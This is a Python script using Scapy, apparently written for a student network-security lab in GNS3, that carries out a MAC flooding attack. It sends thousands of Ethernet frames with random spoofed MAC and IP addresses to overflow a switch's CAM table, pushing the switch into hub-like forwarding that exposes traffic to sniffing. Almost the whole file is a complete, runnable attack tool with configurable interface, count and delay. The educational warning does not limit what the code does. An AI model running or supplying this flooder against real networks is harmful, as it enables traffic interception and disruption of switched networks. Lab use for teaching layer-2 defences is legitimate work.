#!/usr/bin/env python3
# MAC Flooding - Laboratorio de Seguridad de Redes
# Autor: Estudiante de Ciberseguridad
# Entorno: GNS3 (Ambiente Controlado)
# ADVERTENCIA: Uso exclusivamente educativo en entornos controlados.

from scapy.all import *
import random, time, sys, os, argparse


def random_mac():
    """Genera una direccion MAC aleatoria."""
    return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])


def mac_flood(iface='eth0', count=5000, delay=0.0):
    """
    Desborda la tabla CAM del switch con MACs falsas aleatorias.
    Parametros:
        iface  (str)  : Interfaz de red
        count  (int)  : Numero de frames a enviar (default: 5000)
        delay  (float): Pausa entre frames en segundos (default: 0.0)
    """
    print("=" * 60)
    print("  MAC FLOODING - Laboratorio GNS3")
    print(f"  Interfaz: {iface} | Frames: {count} | Delay: {delay}s")
    print("=" * 60)
    print("[*] Iniciando MAC Flooding...")
    print("[*] Objetivo: desbordar tabla CAM del switch")
    sent = 0
    start_time = time.time()
    try:
        while sent < count:
            src_mac = random_mac()
            dst_mac = random_mac()
            pkt = (
                Ether(src=src_mac, dst=dst_mac) /
                IP(
                    src=f'10.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}',
                    dst=f'10.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}'
                ) /
                UDP(
                    sport=random.randint(1024, 65535),
                    dport=random.randint(1, 1023)
                ) /
                Raw(load=bytes(random.randint(0, 255) for _ in range(18)))
            )
            sendp(pkt, iface=iface, verbose=False)
            sent += 1
            if sent % 500 == 0 or sent == count:
                elapsed = time.time() - start_time
                pps = sent / elapsed if elapsed > 0 else 0
                print(f"  [+] Frames: {sent}/{count} | {pps:.0f} fps")
            if delay > 0:
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n[!] Interrumpido.")
    elapsed = time.time() - start_time
    print(f"\n[+] MAC Flooding completado.")
    print(f"[+] Frames enviados: {sent} | Tiempo: {elapsed:.2f}s")
    print(f"[!] El switch puede estar operando en modo HUB.")


if __name__ == '__main__':
    if os.geteuid() != 0:
        sys.exit("[-] Requiere privilegios root.")
    parser = argparse.ArgumentParser(description='MAC Flooding - GNS3')
    parser.add_argument('-i', '--interface', default='eth0')
    parser.add_argument('-c', '--count', type=int, default=5000)
    parser.add_argument('-d', '--delay', type=float, default=0.0)
    args = parser.parse_args()
    mac_flood(args.interface, args.count, args.delay)
